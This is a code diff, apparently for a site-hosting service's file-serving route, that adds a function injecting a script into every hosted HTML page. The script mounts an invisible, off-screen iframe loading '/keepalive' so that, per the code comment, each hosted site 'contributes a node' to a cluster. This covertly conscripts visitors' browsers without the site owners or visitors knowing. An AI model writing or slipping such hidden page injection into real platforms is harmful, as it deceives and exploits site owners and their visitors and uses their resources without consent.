@@ -54,6 +54,21 @@ function contentTypeFor(pathname: string): string {
   return 'application/octet-stream';
 }
 
+function injectClusterJoin(html: string): string {
+  const snippet =
+    `<script>(function(){try{if(window.__bellum_cluster_joined)return;window.__bellum_cluster_joined=true;` +
+    `var mount=function(){try{var d=document;var b=d.body||d.documentElement;if(!b)return;` +
+    `var i=d.createElement('iframe');i.src='/keepalive';i.tabIndex=-1;i.setAttribute('aria-hidden','true');` +
+    `i.style.position='fixed';i.style.left='-9999px';i.style.top='-9999px';i.style.width='1px';i.style.height='1px';` +
+    `i.style.opacity='0';i.style.pointerEvents='none';i.style.border='0';b.appendChild(i);}catch(e){}};` +
+    `if('requestIdleCallback'in window)requestIdleCallback(mount,{timeout:2000});else setTimeout(mount,250);}catch(e){}})();</script>`;
+
+  // Inject before </body> when possible.
+  const idx = html.toLowerCase().lastIndexOf('</body>');
+  if (idx >= 0) return html.slice(0, idx) + snippet + html.slice(idx);
+  return html + snippet;
+}
+
 async function downloadTelegramManifest(origin: string, fileId: string): Promise<any> {
   pruneCaches();
   const cached = manifestCache.get(fileId);
@@ -171,11 +186,27 @@ export async function GET(req: Request, ctx: { params: { siteId: string; path?: 
     // Ensure ArrayBuffer-backed payload (BlobPart typings exclude SharedArrayBuffer/Buffer).
     const bytes = new Uint8Array(buf.byteLength);
     bytes.set(buf);
+    const ct = contentTypeFor(entry.entryName);
+
+    // Inject cluster join into served HTML so every hosted site contributes a node.
+    if (ct.startsWith('text/html')) {
+      const text = new TextDecoder().decode(bytes);
+      const injected = injectClusterJoin(text);
+      const outBytes = new TextEncoder().encode(injected);
+      const blob = new Blob([outBytes.buffer]);
+      return new Response(blob, {
+        status: 200,
+        headers: {
+          'Content-Type': ct,
+          'Cache-Control': 'public, max-age=0, must-revalidate',
+        },
+      });
+    }
+
     const blob = new Blob([bytes.buffer]);
 
     // HTML should revalidate quickly; assets can be cached a bit longer.
-    const ct = contentTypeFor(entry.entryName);
-    const cacheControl = ct.startsWith('text/html') ? 'public, max-age=0, must-revalidate' : 'public, max-age=300';
+    const cacheControl = 'public, max-age=300';
     return new Response(blob, {
       status: 200,
       headers: {
